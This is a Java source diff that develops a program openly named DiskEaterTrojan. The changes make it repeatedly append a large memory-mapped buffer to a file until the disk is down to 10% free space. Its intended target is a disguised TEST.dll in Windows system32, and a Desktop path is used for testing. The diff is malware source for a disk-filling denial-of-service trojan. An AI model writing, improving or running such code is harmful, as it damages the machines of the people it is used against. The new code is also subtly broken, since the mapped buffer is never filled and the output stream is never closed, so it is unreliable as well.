@@ -1,5 +1,9 @@
 
 import java.io.*;
+import java.nio.ByteBuffer;
+import java.nio.channels.Channels;
+import java.nio.channels.FileChannel;
+import java.nio.channels.WritableByteChannel;
 import java.util.Scanner;
 
 import javax.swing.filechooser.FileSystemView;
@@ -15,6 +19,7 @@ public class DiskEaterTrojan
 		//This requires admin priveleges to write to. I'm not sure how to do this right now.
 		String actualPath = System.getenv("WINDIR") + "/system32/TEST.dll";
 		
+		//I'm using this path for now for testing the file write process
 		String testPath = System.getProperty("user.home") + "/Desktop/TEST.dll";
 		
 		if(input.equals("s"))
@@ -30,20 +35,26 @@ public class DiskEaterTrojan
 			
 	}
 	
-	private static void writeFile(String fileName)
+	private static void writeFile(String filePath)
 	{
 		String line = "Help I am stuck in a fortune cookie message factory!!!!\n";
 		
 		try {
-			DataOutputStream outStream = new DataOutputStream(new BufferedOutputStream(new FileOutputStream(fileName, true)));
+			byte[] buffer = "Help I am trapped in a fortune cookie factory\n".getBytes();
+			int number_of_lines = 400000;
+
+			FileChannel rwChannel = new RandomAccessFile(filePath, "rw").getChannel();
+			ByteBuffer wrBuf = rwChannel.map(FileChannel.MapMode.READ_WRITE, 0, buffer.length * number_of_lines);
+			byte[] largerBuffer = new byte[wrBuf.capacity()];
+			((ByteBuffer) wrBuf.duplicate().clear()).get(largerBuffer);
 			
-			//Stop writing the file when we only have 10% disk space left
-			while(checkFreeSpacePercent(fileName) > 10) 
+			DataOutputStream outStream = new DataOutputStream(new BufferedOutputStream(new FileOutputStream(filePath, true)));
+			
+			while(checkFreeSpacePercent(filePath) > 10.0f)
 			{
-				outStream.writeUTF(line);
+			    outStream.write(largerBuffer);
 			}
-			outStream.flush();
-			outStream.close();
+			rwChannel.close();
 			
 		} catch (FileNotFoundException e) {
 			// TODO Auto-generated catch block
@@ -63,5 +74,11 @@ public class DiskEaterTrojan
 		
 		System.out.println(percent);
 		return percent;
+	}
+	
+	private static long getFreeSpace(String filePath)
+	{
+		File f = new File(filePath);
+		return f.getFreeSpace();
 	}
 }
